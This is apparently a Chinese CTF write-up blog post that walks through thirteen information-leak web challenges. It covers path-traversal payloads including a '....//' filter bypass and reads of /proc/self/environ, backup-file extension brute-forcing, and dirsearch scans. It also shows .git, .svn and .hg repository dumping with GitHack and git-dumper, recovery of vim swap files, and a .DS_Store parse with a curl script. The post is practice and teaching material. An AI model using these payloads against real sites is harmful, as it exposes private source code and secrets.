---
title: 信息泄露
date: 2026-05-11 21:59:21
categories:
  - CTF
tags:
  - 信息泄露
description: 泄露的学习
cover: /img/cover-tech.svg
comments: true
---

![image-20260508215839930](/img/posts/infoleakstudy/01.webp)

1.打开异常日志可以得到该代码，发现该代码为base64，对等号后面解码得到  fl4g.txt

```
 secret_file_b64=Zmw0Zy50eHQ=
```

2.猜测flag可能位于该文件下,可以利用目录穿越直接拿到flag。

```
../../../../../../fl4g.txt
```

3,也可以用该代码拿到flag。

```
../../../../../../proc/self/environ
```

# 第二题

该题目与第一题相同，解码后也是fl4g.txt

1.但是当我输入上一题的答案的时候。

```
../../../../../../fl4g.txt
```

![image-20260508220857360](/img/posts/infoleakstudy/02.webp)

2.它居然是错误的，但是本喵用了一点科技，得知它的源码中把../给过滤掉了，于是我补充上它省略的代码，最后得到flag。

```
....//....//....//....//flag4.txt
```

3.当然也可以，又学会了一招，喵！

```
....//....//....//....//....//....//proc/self/environ
```

# 第三题

![image-20260508222322001](/img/posts/infoleakstudy/03.webp)

注意：该网站在近期将完成下线，请各位管理员在正式清理之前根据需要自行完成相关数据的备份或导出。

通过观察注意到这句话，意思是让我们去下载文件，尽管它把flag的文件已经给你但是我在尝试后发现啥都没有喵？通过询问大肘子吗，他给我了一份秘籍。

```
.zip
.rar
.tar
.tar.gz
.7z
.bak
.old
.swp
.txt
```

据我推测它一个是备用文件把！那我使用bp进行爆破吗，发现.bak有异常，所以我输入该地址，下载文件打开后直接拿到flag。

```
http://docker.qingcen.net:48327/app/flag.txt.bak

```

当然如果无法下载，访问一下该地址也可以得到flag。

```
 http://docker.qingcen.net:44450/flag.txt.bak?download=1
```

# 第四题

![image-20260509175134578](/img/posts/infoleakstudy/04.webp)

由图片观察到其存在一个入口，大概率需要扫目录，直接将该网址放入dirsearch,

```
dirsearch -u " http://docker.qingcen.net:48839/"
```

![image-20260509175539711](/img/posts/infoleakstudy/05.webp)

找到一个文件后缀名，直接放在网址上，找到flag。

# 第五题

打开该题啥都没有发现，就是一堆烟花，综合考虑下对其进行扫目录，发现全是 .git的文件，发现是git泄露，用githack进行文件还原，找到flag.txt就找到了flag。

```php
python3 GitHack.py 'http://docker.qingcen.net:44461/.git'
```

# 第六题

![image-20260509185243521](/img/posts/infoleakstudy/06.webp)

通过扫目录，发现依旧全是git文件，通过git文件找到源码，http://docker.qingcen.net:48898/HKBRLMlv.php 然后用hackbar或者bp直接请求即可得到flag。

![image-20260509190112601](/img/posts/infoleakstudy/07.webp)

# 第七题

用dirsearch扫出来后依旧全是git文件，但是经过复原，发现只有一个无用的html文件，通过前辈的力量，其有用的文件可能在以前被删除，所以得拿新工具，我在cloud的指导下用gitlens直接找到历史里面的flag。下面是大佬的wp，但是·还是有点不太懂

dirsearch 扫目录扫出来依旧全是 `/.git/` ，但是 GitHack 只还原出来一个没用的 html文件。

说明真正的源码或 flag 大概率存在于**历史提交记录**或其他的暂存分支中（即曾经提交过，但为了防泄露在最新版本中被删除了）。

接下来使用 git-dumper 提取并分析整个 Git 仓库的历史记录：

bash

自动换行复制

```bash
git-dumper http://docker.qingcen.net:44468/.git/ xixi
cd xixi
```

1. 审计历史提交记录：

   使用以下命令查看所有分支的提交历史，并显示每次提交具体增删了哪些文件。重点寻找类似 "remove flag"、"delete code"、"update" 这样的提交信息，或者注意观察哪个 commit ID 删除了可疑的 PHP 或 TXT 文件。

   bash

   自动换行复制

   ```bash
   git log --all --stat
   ```

2. 查看所有历史提交的具体代码差异：

   bash

   自动换行复制

   ```bash
   git log -p
   ```

3. 查看历史 Commit 中的内容：

   假设发现了一个可疑的 commit ID（例如哈希值是

    

   ```
   8f3a9b2...
   ```

   ），可以直接使用

    

   ```
   git show
   ```

    

   查看那次提交的具体代码变更，flag 往往在被标红的删除行里：

   bash

   自动换行复制

   ```bash
   git show 8f3a9b2...
   ```

4. 把整个本地文件夹直接回滚到那个存在源码的历史状态：

   bash

   自动换行复制

   ```bash
   git reset --hard 8f3a9b2...
   ```

5. 检查其他隐藏位置：

   如果在历史 commit 里没找到，再检查一下是不是在其他分支或者暂存区：

   - 查看所有分支：`git branch -a` （若有特殊分支，用 `git checkout 分支名` 切换）。
   - 查看暂存区：`git stash list` （若有回显，用 `git stash pop` 弹出隐藏的更改）。

本题只需要输入 `git log -p` 。

# 第八题

用dirsearch发现全是/.svn/的文件，然后依旧前辈打法，找到对应的工具，用脚本还原件，然后在侧边的文件栏就能找到对应地文件，然后就拿到了flag

# 第九题

![image-20260509212701901](/img/posts/infoleakstudy/08.webp)

扫目录后依旧是.hg地文件，然后通过还原找到flag的位置即可

![image-20260509213545284](/img/posts/infoleakstudy/09.webp)

# 第十题

![image-20260509214055917](/img/posts/infoleakstudy/10.webp)

然后在网页中打开该后缀名的页面，发现只有403错误的访问，然后我使用f12看到了其中隐藏的注释，说管理员使用vim打开了该文件，这疑似是一个vim的swp漏洞，然后我直接在网址输入/.flag.txt.swp最后直接得到flag。当使用 vim 编辑器编写 flag.txt 文件时，会有一个 .flag.txt.swp 文件产生，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来。

# 第十一题

![image-20260511210613353](/img/posts/infoleakstudy/11.webp)

通过扫盘找到了一个/flag.txt的文件，试着在页面访问发现flag已经被删除，但是在源码中找到了这样一句话【都怪你们，害我被傻逼千鹤骂了。我开vim把flag.txt删掉了，这下应该没问题了】所以我们直接下载swp的文件打开就找到了flag。

![image-20260511211041640](/img/posts/infoleakstudy/12.webp)

# 第十二题

通过扫描目录发现出现了一个/.DS_Store和/flag.txt的后缀名，通过查看flag.txt的文件发现什么没有，打开另一个文件直接找到了flag。如果没有的话下载到本地也可以看到。

![image-20260511211506169](/img/posts/infoleakstudy/13.webp)

# 第十三题

通过扫目录得知文件格式为 /.DS_Store，将其下载到本地发现看不懂，这咋办，只能用强大的ai大人了看看他是如何解密的。

通过发现这是一个二进制文件

```base
# 普通 ASCII
strings -a .DS_Store
# 扩展单字节字符
strings -a -e S .DS_Store
# UTF-16BE
strings -a -e b .DS_Store
# UTF-16LE
strings -a -e l .DS_Store
# UTF-32BE
strings -a -e B .DS_Store
# UTF-32LE
strings -a -e L .DS_Store
```

只有 `strings -a -e b .DS_Store` 找出来最正常：

txt

自动换行复制

```txt
.archive
finder-cache-0
.sync_part_aa
finder-cache-1
.sync_part_ab
finder-cache-2
.sync_part_ac
finder-cache-3
.sync_part_ad
finder-cache-4
.sync_part_ae
finder-cache-5
```

根据泄露的文件路径，用 curl 查看回显：

bash

自动换行复制

```bash
curl http://docker.qingcen.net:44439/.archive/.sync_part_aa
curl http://docker.qingcen.net:44439/.archive/.sync_part_ab
curl http://docker.qingcen.net:44439/.archive/.sync_part_ac
curl http://docker.qingcen.net:44439/.archive/.sync_part_ad
curl http://docker.qingcen.net:44439/.archive/.sync_part_ae
```

返回：txt自动换行复制

```txt
H4sIAAAAAAAAA0vLSUyvTkyzSDFNM0nUNUk1s9A1SUlM1LWwsLTQNTZLSjIyTkoySUs1qAUAcX3v
CCoAAAA=
```

注意开头：

text

自动换行复制

```text
H4sIA
```

很多时候代表：**gzip 文件内容被 base64 编码后得到的字符串**。

所以需要：

txt

自动换行复制

```txt
H4sIA...AAAA=
↓ base64 -d
gzip 压缩数据
↓ gzip -d
原始内容
```

即：

bash

自动换行复制

```bash
echo 'H4sIAAAAAAAAA0vLSUyvTkyzSDFNM0nUNUk1s9A1SUlM1LWwsLTQNTZLSjIyTkoySUs1qAUAcX3v
CCoAAAA=' | base64 -d | gzip -d
```

得到 flag 。

### AI大人的解一、信息收集

访问 `http://docker.qingcen.net:49647/`，页面给出关键提示：

> 当前平台仅支持通过 **macOS Finder** 进行文件上传，其他客户端暂不兼容。

暗示服务器曾用作 macOS WebDAV 文件共享，可能残留 `.DS_Store` 文件。

### 二、发现 .DS_Store

用 dirsearch 扫描：



```bash
dirsearch -u http://docker.qingcen.net:49647/
```

发现 `/.DS_Store` 可访问（200，16388 bytes），而 `flag.txt` 返回 403：



```bash
curl -O http://docker.qingcen.net:49647/.DS_Store    # 16388 bytes
curl http://docker.qingcen.net:49647/flag.txt         # 403 Permission denied
```

### 三、解析 .DS_Store

`.DS_Store` 是苹果桌面服务存储文件，保存目录内的文件元数据。文件内的字符串以 UTF-16BE 编码，用 `strings` 提取：



```bash
strings -a -e b .DS_Store
```

输出：



```
.archive
finder-cache-0
.sync_part_aa
finder-cache-1
.sync_part_ab
finder-cache-2
.sync_part_ac
finder-cache-3
.sync_part_ad
finder-cache-4
.sync_part_ae
finder-cache-5
```

`finder-cache-N` 是 Finder 的缓存条目，真正的文件列表是：



```
.archive
.sync_part_aa
.sync_part_ab
.sync_part_ac
.sync_part_ad
.sync_part_ae
```

前 6 个是文件（DS_Store 条目用 `noteustr` 类型标记），后 6 个是对应的 Finder 缓存。

### 四、尝试目录结构

最初我直接访问根目录下的文件，全部返回维护页面。直到看到 writeup 提示：**`.archive` 不是一个文件，而是一个目录**。文件在该目录下：



```bash
# ❌ 错误尝试
curl http://docker.qingcen.net:49647/.sync_part_aa    # 维护页面

# ✅ 正确路径
curl http://docker.qingcen.net:49647/.archive/.sync_part_aa
curl http://docker.qingcen.net:49647/.archive/.sync_part_ab
curl http://docker.qingcen.net:49647/.archive/.sync_part_ac
curl http://docker.qingcen.net:49647/.archive/.sync_part_ad
curl http://docker.qingcen.net:49647/.archive/.sync_part_ae
```

### 五、下载并还原分片

每个分片返回一段 base64 字符串：



```
aa: H4sIAAAAAAAAA0vLSU
ab: yvtkw1TzRLMknTTU41
ac: SNQ1MTWz1E1MtDDWNT
ad: RJSTS3TDM0M0gxrAUA
ae: 7yh+PSoAAAA=
```

拼接后：



```
H4sIAAAAAAAAA0vLSUyvtkw1TzRLMknTTU41SNQ1MTWz1E1MtDDWNTRJSTS3TDM0M0gxrAUA7yh+PSoAAAA=
```

`H4sI` 开头表明这是 **gzip 压缩数据经 base64 编码**。解码还原：



```bash
echo 'H4sIAAAAAAAAA0vLSUyvtkw1TzRLMknTTU41SNQ1MTWz1E1MtDDWNTRJSTS3TDM0M0gxrAUA7yh+
PSoAAAA=' | base64 -d | gunzip
```

### 六、获取 Flag



```
flag{9e7a6b4f-ce0a-4569-aa83-14da79f160d1}
```

### 完整一键脚本



```bash
#!/bin/bash
URL="http://docker.qingcen.net:49647"
COMBINED=""
for part in aa ab ac ad ae; do
    COMBINED+=$(curl -s "${URL}/.archive/.sync_part_${part}")
done
echo "$COMBINED" | base64 -d | gunzip
所有题目均由青岑提供，若有侵权，请及时联系作者
```
